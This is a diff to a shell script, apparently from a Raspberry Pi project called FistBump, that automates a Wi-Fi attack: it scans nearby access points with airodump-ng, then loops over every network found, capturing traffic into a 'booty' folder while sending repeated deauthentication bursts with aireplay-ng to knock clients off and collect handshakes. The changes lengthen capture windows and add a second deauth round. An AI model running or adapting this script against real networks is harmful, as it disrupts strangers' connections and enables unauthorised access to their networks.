@@ -32,7 +32,6 @@ sudo airmon-ng start wlan0
 
 sleep 2
 # stop monitor setup indicators
-#sudo pkill -f -SIGINT /home/pi/FistBump/random_purple.py &
 kill $INDI
 
 # ---------------------------------------------------------------------------------------------------- start ap scan
@@ -41,16 +40,17 @@ INDI=$!
 
 echo "------------------Starting Scan"
 
-	{ timeout -k 15 15 airodump-ng -a -w my --output-format csv mon0;} &
+	{ timeout -k 30 30 sudo airodump-ng -a -w my --output-format csv mon0;} &
 PID=$!
 
-# wait 15 seconds
-sleep 15
+# wait 30 seconds
+sleep 30
 
 #kill scan
 kill -TERM $PID
 #sudo pkill -f -SIGINT /home/pi/FistBump/purple_scan.py &
 kill $INDI
+
 # ---------------------------------------------------------------------------------------------------- begin parsing results
 python /home/pi/FistBump/random_yellow.py &
 INDI=$!
@@ -96,14 +96,19 @@ do
 	echo "---------------------------------------------------"
 	echo "$f1 $f2 $f3 $f4"
 	echo "---------------------------------------------------"
-		{ timeout -k 20 20 airodump-ng -a -w "$bootydir"/"$f4" --bssid "$f1" --channel "$f3" --output-format cap mon0;} &
+		{ timeout -k 60 60 sudo airodump-ng -a -w "$bootydir"/"$f4" --bssid "$f1" --channel "$f3" --output-format cap mon0;} &
 	PID=$!
 
 	#deauth
-	aireplay-ng --deauth 10 -a "$f1" --ignore-negative-one mon0 
+	sudo aireplay-ng --deauth 15 -a "$f1" --ignore-negative-one mon0 
 
- 	sleep 20
-	#kill scan
+ 	sleep 10
+
+	#deauth again
+	sudo aireplay-ng --deauth 15 -a "$f1" --ignore-negative-one mon0
+
+	sleep 10
+
 	kill -TERM $PID
 done < $bootydir/sorted.csv
 
